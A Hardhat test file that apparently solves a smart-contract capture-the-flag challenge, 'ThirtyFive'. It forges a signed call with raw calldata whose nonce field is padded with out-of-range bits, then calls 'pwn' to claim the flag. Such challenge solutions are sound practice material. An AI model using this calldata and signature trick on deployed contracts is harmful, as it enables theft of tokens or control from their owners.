const { expect } = require("chai");
const { network, waffle, ethers } = require("hardhat");
const { deployContract } = waffle;
const provider = waffle.provider;
const Web3 = require("web3");
const { defaultAbiCoder, hexlify, keccak256, toUtf8Bytes, solidityPack, parseUnits, AbiCoder, parseEther, mnemonicToEntropy } = require("ethers/lib/utils");
const { Console, count } = require("console");
const { BigNumberish, Signer, constants } = require("ethers");
const { SignerWithAddress } = require("@nomiclabs/hardhat-ethers/signers");
var Eth = require('web3-eth');
var RLP = require("rlp");
var { BigNumber } = require('bignumber.js')
var bn = require('bignumber.js');
const { connect } = require("http2");
const hre = require("hardhat");
const { ecsign } = require("ethereumjs-util");
const assert = require("assert");
const { Contract, ContractFactory } = require("@ethersproject/contracts");
const { AbiItem } = require("web3-utils");
const { monitorEventLoopDelay } = require("perf_hooks");
let abiCoder = new AbiCoder();
var web3 = new Web3(provider);

async function _advanceBlock() {
    return ethers.provider.send("evm_mine", [])
}

async function advanceBlock(blockNumber) {
    for (let i = await ethers.provider.getBlockNumber(); i < blockNumber; i++) {
        await _advanceBlock()
    }
}

async function advanceBlockTo(blockNumber) {
    let currentBlock = await ethers.provider.getBlockNumber();
    let moveTo = BigNumber(currentBlock).plus(blockNumber);
    console.log("From: ", currentBlock.toString(), "To: ", moveTo.toString());
    await advanceBlock(moveTo);
}

describe("Simulations", async function () {


    const [owner, addr1, addr2, addr3, addr4, addr5] = provider.getWallets();
    let tf;


    this.beforeEach("Preparing Contracts", async function () {

        let TF = await ethers.getContractFactory("ThirtyFive");
        tf = await TF.deploy("ThirtyFive", "1337");
        await tf.deployed();

    });

    it("let the game begin", async function () {

        let nonce = 1;
        let extended_Time = 2543733733;

        var typeHash = await tf.SIGNING_TYPEHASH();
        const domainSaperator = await tf.DOMAIN_SEPARATOR();
        var messagehash = keccak256(
            defaultAbiCoder.encode(
                ["bytes32", "uint16", "uint"], [typeHash, nonce, extended_Time.toString()])
        );
        var final = keccak256(solidityPack(["bytes1", "bytes1", "bytes32", "bytes32"], ["0x19", "0x01", domainSaperator, messagehash]));
        const { v, r, s } = ecsign(Buffer.from(final.slice(2), "hex"), Buffer.from(owner.privateKey.slice(2), "hex"));
        let sig = "0x" + r.toString("hex") + s.toString("hex") + web3.utils.toHex(v).slice(2)
       // console.log("sig is =>>>>> ", sig);
        let data = "0xa1f6c67b000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000979e4be50000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000004159bf0dbdcfa796e750b89855f88876709d02311ebd1d2dd54f6fc54c6f401c2d748fecf0910c6283cab99cd28f69d2202a558690a84376b617f95ac1be6ff3881c00000000000000000000000000000000000000000000000000000000000000";
        let data2 = "0xa1f6c67b0000000000000000000000000000000000000000000000000000000fffff000100000000000000000000000000000000000000000000000000000000979e4be50000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000004159bf0dbdcfa796e750b89855f88876709d02311ebd1d2dd54f6fc54c6f401c2d748fecf0910c6283cab99cd28f69d2202a558690a84376b617f95ac1be6ff3881c00000000000000000000000000000000000000000000000000000000000000"
       // console.log("data =>>>>>>>>", data2);
        const params = [{
            from: owner.address,
            to: tf.address,
            data: data2
        }];
        const tx = await hre.network.provider.send('eth_sendTransaction', params);

       // console.log(transactionHash);
        //console.log(await tf.nonces(owner.address));
        let token = await tf.callStatic.giveMeMyToken();
        await tf.giveMeMyToken();
       // console.log(token);
        await tf.pwn(token.toString());
        let hacker = await tf.callStatic.HackerWho();
        console.log(hacker);

    });

});

